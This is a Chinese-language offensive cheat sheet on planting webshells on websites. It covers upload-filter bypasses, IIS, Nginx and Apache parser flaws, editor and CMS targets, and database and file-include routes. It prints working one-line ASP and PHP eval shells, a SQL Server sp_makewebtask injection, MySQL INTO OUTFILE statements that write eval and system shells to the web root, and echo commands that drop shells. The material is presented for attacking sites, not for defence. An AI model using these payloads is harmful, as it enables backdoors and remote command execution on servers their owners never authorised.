# 管理权限拿webshell

需要有管理员权限才可以拿shell
通常需要登录后台后执行相关操作
直接上传拿shell

## 数据库备份拿shell

网站对上传得文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等
而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传得文件格式 如jpg、gif等
然后，我们找到上传后得文件路径，通过数据库备份，将文件备份为脚本格式

## 突破上传拿shell

本地js验证上传
服务器mime上传
服务器白名单上传
服务器黑名单上传
服务器filepath上传
双文件上传
%00截断上传
上传其他脚本类型拿webshell

## 修改网站上传类型配置拿webshell

有的网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp|php|jsp|aspx|asa来拿webshell

## 利用解析漏洞拿webshell

1. IIS 5.x/6.0解析漏洞
2. IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞
3. Nginx <8.03空字节代码执行漏洞
4. Apache解析漏洞

## 利用编辑器漏洞拿webshell

常见得编辑器有： fckeditor、ewebeditor、cheditor等

## 网站配置插马拿webshell

通过找到网站默认配置，将一句话插入到网站配置中，不过为了能够成功执行插马，建议先下载该网站源码，进行查看源码过滤规则，以防插马失败
"%><%eval request("cracer")%><%'

## 通过编辑模板拿webshell

1. 通过对网站得模板进行编辑写入一句话，然后生成脚本文件拿webshell
2. 通过将木马添加到压缩文件，把名字改为网站模板类型，上传到网站服务器，拿webshell

## 上传插件拿shell

一些网站为了增加某些功能会在后台添加一些插件来实现
我们可以把木马添加到安装得插件中上传服务器拿shell
常见的有博客类网站、dz论坛都可以

## 数据库执行拿webshell

我们可以通过数据库执行命令导出一句话到网站根目录拿webshell
access数据库导出一般需要利用解析漏洞xx.asp;.xml
sqlserver导出
;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27<%execute(request("cmd"))%>%27%27%27 --

## 数据库命令执行拿webshell

- mysql命令导出shell

Create TABLE study (cmd text NOT NULL);
Insert INTO (cmd) VALUES('<?php eval($_POST[cmd]) ?>')
select cmd from study into outfile 'D:/php/www/htdocs/test/seven.php';
Drop TABLE IF EXISTS study;

- 版本二

use mysql;
create table x[packet text]type=MYISaM;
insert into x (packet) values('<pre><body><?php @system($_GET["cmd"]);?></body></pre>')
select x into outfile 'd:\php\xx.php'

版本三
select '<?php eval($_POST[cmd]);?>' into outfile 'C:/Inetpub/wwwroot/mysql-php/1.php'

## 文件包含拿webshell

先将webshell改为txt文件上传，然后上传一个脚本文件包含该txt文件，可绕过waf拿webshell
asp包含
1. <!--#include file="123.jpg"-->
2. 调用得文件必须和被调用文件在同异目录，否则找不到
3. 如果不在同一目录，用下面的语句：
<!--#include virtual="文件所在目录/123.jpg"-->

php包含

<?
php include("123.jpg");
?>

## 命令执行拿shell

Echo ^<^?php @eval($_POST['cracer']);?^>^ > c:\1.php
^<^%eval request("cracer'")%^>^ > c:\1.php

# 普通权限拿webshell

0day拿webshell
IIS写权限拿webshell
命令执行拿webshell
通过注入漏洞拿webshell
前台用户头像上传拿webshell
strusts拿webshell
java反序列拿shell

# 常见cms拿webshell

良精、科讯、动易、aspcms
dz
米拓cms
帝国cms
phpv9
phpweb
dedecms